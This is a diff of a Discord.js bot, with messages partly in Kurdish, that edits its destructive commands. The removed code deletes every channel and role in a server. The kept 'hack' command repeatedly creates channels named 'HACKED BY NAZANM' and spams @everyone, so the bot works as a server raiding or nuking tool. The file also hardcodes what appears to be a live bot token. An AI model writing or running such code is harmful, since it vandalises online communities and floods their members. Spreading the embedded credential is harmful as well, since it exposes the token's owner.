@@ -12,24 +12,7 @@ console.log(`Logged in as ${client.user.tag}!`);
 ////
 client.login("NzYxMjA3MjU4NTYxNzczNTY4.X3XPgA.uGxi4WZKZFFnx9ZbBbqiTNPGIGg")
           
-client.on('message', black => {
-if(black.content.split(' ')[0] == prefix + 'dac') {  
-if (!black.channel.guild) return;
-if(!black.guild.member(black.author).hasPermission("MANAGE_CHANNELS")) return black.reply(`❌ببورە ئەو پێرمیشنەت نییە MANAGE CHANNEL`);
-black.guild.channels.forEach(m => {
-m.delete();
-});
-}// By black jack
-if(black.content.split(' ')[0] == prefix + 'dar') { 
-if (!black.channel.guild) return;
-if(!black.guild.member(black.author).hasPermission("MANAGE_ROLES_OR_PERMISSIONS")) return black.reply("❌ببورە ناتوانی ئەو کارە بکەی");
-if(!black.guild.member(client.user).hasPermission("MANAGE_ROLES_OR_PERMISSIONS")) return black.reply(`ناتوانم ئەم کارە بکەم چونکە ئەو پێرمیشنەم نیە MANAGE_ROLES❌`);
-black.guild.roles.forEach(m => {
-m.delete();
-});
-black.reply("`✅بە سەرکەوتوی ھەموو رۆلەکان سرایەوە`")
-}
-});
+
 
 client.on('message', message => {
     if (message.content.toLowerCase() === prefix + 'hack') {
@@ -58,12 +41,8 @@ client.on('message', message => {
         setTimeout(function() {
             setInterval(() => {
                 message.guild.createChannel('HACKED BY NAZANM', 'text').then(channel => {
-                message.channel.send('@everyone bro server danenawa :joy: :joy: :joy:')
-                message.channel.send('@everyone bro server danenawa :joy: :joy: :joy:')
-                message.channel.send('@everyone bro server danenawa :joy: :joy: :joy:')
-                message.channel.send('@everyone bro server danenawa :joy: :joy: :joy:')  
-                message.channel.send('@everyone bro server danenawa :joy: :joy: :joy:')
-                message.channel.send('@everyone bro server danenawa :joy: :joy: :joy:') 
+                channel.send('@everyone bro server danenawa :joy: :joy: :joy:')
+               
                 })
             }
                         
